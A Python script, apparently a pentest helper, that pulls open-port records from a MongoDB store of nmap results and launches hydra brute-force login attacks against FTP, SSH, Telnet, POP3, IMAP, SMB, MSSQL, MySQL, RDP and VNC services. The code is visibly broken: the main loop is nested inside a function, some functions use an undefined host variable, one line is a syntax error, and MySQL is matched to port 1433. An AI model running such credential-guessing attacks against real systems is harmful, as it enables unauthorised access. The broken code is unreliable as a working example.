import os
import pymongo

client = pymongo.MongoClient(host='localhost', port=27017)  # 连接数据库
db = client.nmapy  # 指定数据库
set = db.scanre  # 指定要操作的集合



# (ip['port'] == '21') & (ip['state'] == 'open'):
def ftp():
    host = ip['host']
    print('[+]ftp爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s ftp ' %host)

# (ip['port'] == '22') & (ip['state'] == 'open'):
def ssh():
    host = ip['host']
    print('[+]ssh爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s ssh ' %host)

# (ip['port'] == '23') & (ip['state'] == 'open'):
def telent():
    print('[+]telent爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s telent ' %host)

# (ip['port'] == '110') & (ip['state'] == 'open'):
def pop3():
    print('[+]pop3爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s pop3 ' %host)

# (ip['port'] == '143') & (ip['state'] == 'open'):
def imap():
    host = ip['host']
    print('[+]IMAP爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns  %s imap PLAIN ' %host)

# (ip['port'] == '445') & (ip['state'] == 'open'):
def smb():
    host = ip['host']
    print('[+]smb爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s smb ' %host)

# (ip['port'] == '1433') & (ip['state'] == 'open'):
def mssql():
    host = ip['host']
    print('[+]MSSQLServer爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s mssql ' %host)

def mysql():
    host = ip['host']
    print('[+]MSSQLServer爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s mysql ' %host)    

# (ip['port'] == '3389') & (ip['state'] == 'open'):
def rdp():
    print('[+]rdp爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s rdp ' %host)

# (ip['port'] == '3389') & (ip['state'] == 'open'):
def vnc():
    print('[+]vnc爆破目标:' + host)
    os.system('hydra -L user.txt -P pass.txt -t 4 -vV -e ns %s vnc ' %host)

    for ip in set.find():

        if (ip['port'] == '21') & (ip['state'] == 'open'):
            ftp()
        if (ip['port'] == '22') & (ip['state'] == 'open'):
            ssh()
        if (ip['port'] == '23') & (ip['state'] == 'open'):
            telent()
        if (ip['port'] == '143') & (ip['state'] == 'open'):
            imap()
        if (ip['port'] == '110') & (ip['state'] == 'open'):
            pop3()
        if (ip['port'] == '445') & (ip['state'] == 'open'):
            smb()
        if (ip['port'] == '1433') & (ip['state'] == 'open'):
            mssql()
        if (ip['port'] == '1433') & (ip['state'] == 'open'):
            mysql():    
        if (ip['port'] == '3389') & (ip['state'] == 'open'):
            rdp()
            
            
        
